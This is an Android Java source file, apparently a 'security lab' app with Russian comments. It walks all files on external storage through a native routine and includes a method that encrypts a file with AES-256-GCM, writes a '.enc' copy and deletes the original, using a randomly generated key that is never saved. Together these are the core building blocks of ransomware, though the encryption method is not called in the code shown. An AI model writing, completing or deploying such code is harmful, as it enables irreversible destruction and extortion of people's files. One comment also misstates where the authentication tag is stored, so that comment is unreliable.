package com.security.lab;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.SecureRandom;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class MainActivity extends Activity {
    static {
        System.loadLibrary("securitylab");
    }

    // Нативный обход файлов (nftw на C)
    private native int nativeWalkFiles(String rootPath);

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        TextView view = new TextView(this);
        view.setPadding(32, 48, 32, 32);

        String ext = Environment.getExternalStorageDirectory().getAbsolutePath();
        int count = nativeWalkFiles(ext);
        view.setText("Android Security Lab\n\nWalked files: " + count);
        setContentView(view);
    }

    // AES-256-GCM шифрование одного файла: IV(12) + TAG(16) + ciphertext
    private void encryptFile(File in, SecretKey key) throws Exception {
        byte[] plain = readAll(in);
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);

        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(plain);

        File out = new File(in.getAbsolutePath() + ".enc");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(iv);
        fos.write(ct);   // GCM сам добавляет тег в конце
        fos.close();
        in.delete();
    }

    private static byte[] readAll(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        byte[] buf = new byte[(int) f.length()];
        int r = fis.read(buf);
        fis.close();
        return buf;
    }

    // Генерация AES-256 ключа
    private static SecretKey genAesKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        return kg.generateKey();
    }
}
